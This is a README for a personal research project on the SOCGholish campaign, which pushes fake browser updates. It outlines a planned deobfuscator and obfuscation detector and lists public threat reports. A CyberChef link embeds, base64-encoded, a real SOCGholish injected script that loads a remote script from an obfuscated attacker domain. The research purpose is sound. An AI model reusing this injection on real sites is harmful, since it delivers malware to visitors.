# SOCGholish

## Introduction

This repository holds my investigations into the SOCGholish campaign! After hearing about SOCGholish at work and reading about the extensive infrastructure built around deployment of the malicious payloads through these sites that social engineer users to download fake updates for their browsers, I wanted to do some digging and investigate some of the malicious JavaScript injections myself.

After deobfuscating some of their JS code, I thought I'd work on developing my own JS deobfuscator! Yes, there are plenty that exist, especially this useful CyberChef recipe...

```
https://gchq.github.io/CyberChef/#recipe=JavaScript_Beautify('%5C%5Ct','Auto',true,true)Subsection('(?%3C%3D%5C%5C(.%7B1%7D).%5BA-Za-z0-9:%5C%5C.%5C%5C?%5C%5C_%5C%5C%5B%5C%5C%5D%5C%5C%2B%5C%5C/%5C%5C%5E%5C%5C(%5C%5C%5C%5C%5C%5C-)%5D%7B9,%7D%5C%5C%3D%7B0,1%7D%5BA-Za-z0-9%5D%7B0,%7D',true,true,false)Regular_expression('User%20defined','(.).',true,true,false,false,false,false,'List%20matches')Regular_expression('User%20defined','%5E.(.*)$',true,true,false,false,false,false,'List%20capture%20groups')Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':'%5C%5Cn'%7D,'',true,false,true,false)&input=OyhmdW5jdGlvbigpe3ZhciBnZT1kb2N1bWVudC5yZWZlcnJlcjt2YXIgcnU9d2luZG93LmxvY2F0aW9uLmhyZWY7dmFyIGx6PW5hdmlnYXRvci51c2VyQWdlbnQ7dmFyIGRoPW5ldyBSZWdFeHAobGcoJ3A6aS9vL2UoeFtmXnAvZV1uK2Epcy9mJykpO2lmKCFnZXx8cnUubWF0Y2goZGgpWzFdPT1nZS5tYXRjaChkaClbMV18fGx6LmluZGV4T2YobGcoJ3ZXeWlzbmFkYW95d3hzZicpKT09LTF8fHdpbmRvdy5sb2NhbFN0b3JhZ2VbbGcoJ3dfa19wX2N1a3RobWthdicpXSl7cmV0dXJuO312YXIgbHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7bHMudHlwZT0ndGV4dC9qYXZhc2NyaXB0Jztscy5hc3luYz10cnVlO2xzLnNyYz1sZygndWhndGZ0d3Bvc3M6bC9vL2R0dnJkYXdpem5raWduamdoLmxyd2Vjbmstc2t2YWd0b2hreW9iaWVlcm1tYmVpanJvdC5lY2dvYm1jL2JyZGVucGJvc3J1dGk/anJ4PWlkZmpmMGMzak1lRGdnYXlxWnBUeWNlNXdaaW1nTnBoaU5xMmZFdHdyWXMyZk1xMnlZaWpwQXozc053Q2JadWpoYWlXZVFvOWtNZWp6WXF6dScpO3ZhciBlbT1kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07ZW0ucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUobHMsZW0pO2Z1bmN0aW9uIGxnKHBlKXt2YXIgem49Jyc7Zm9yKHZhciBreT0wO2t5PHBlLmxlbmd0aDtreSsrKXtpZihreSUyKXt6bis9cGVba3ldO319cmV0dXJuIHpuO319KSgpOw
```

Source: https://twitter.com/th3_protoCOL/status/1549829527802712064
(There's a shortened URL in the above Tweet!)

...as well as many other JavaScript deobfuscators available for free online, but I wanted to make a more generalized SOCGholish deobfuscator so that it works on all single/double base64 encoded strings and character substitution functions. Maybe one already exists, but this is meant to be a personal project for learning purposes.

In addition to that, I started wondering how it would be possible to detect obfuscated JavaScript - or obfuscated code in any language, for that matter - in general. I read a few articles that focus on several metrics derived from the code, such as the length, entropy, and N-grams, while others relied on deep learning and other AI-related technology to detect the presence of obfuscated code. If you couldn't tell from reading this, I'm a complete novice and just want to get my hands dirty with this stuff - so this is another side project related to my main investigations into SOCGholish.

In the end, my goal is to develop a rudimentary code obfuscation detector and a JavaScript deobfuscator specific for SOCGholish by the end of the year. Of course, I'll have to have some fun looking at actual obfuscated code - but I'm hoping that I'll get plenty of that as I continue this side project and all.

As I continue this endeavor, this readme file will be updated with known IOCs/domains related to Stage 2 of SOCGholish. I'm going off of @ex_raritas and his definitions of each SOCGholish stage - that Tweet can be found here: https://twitter.com/ex_raritas/status/1541805778016735232.

In the future, there will be a "Summary" section in this readme file that summarizes the overall research done into SOCGholish to this date - at least, all that I could find so far.

## Resources

Explanation of each SOCGholish stage:
https://twitter.com/ex_raritas/status/1541805778016735232

Tweet linking to the SOCGholish deobfuscator:
https://twitter.com/th3_protoCOL/status/1549829527802712064

RedCanary's report on SocGholish:
https://redcanary.com/threat-detection-report/threats/socgholish/

Microsoft's research into Raspberry Robin and its link to SocGholish:
https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/#DEV-0206-DEV-0243

Sucuri researchers analyzing the NDSW/NDSX malware, which appear to be SOCGholish-related:
https://blog.sucuri.net/2022/06/analysis-massive-ndsw-ndsx-malware-campaign.html

Avast researchers investigating the TDS apparently used by SOCGholish:
https://decoded.avast.io/janrubin/parrot-tds-takes-over-web-servers-and-threatens-millions/
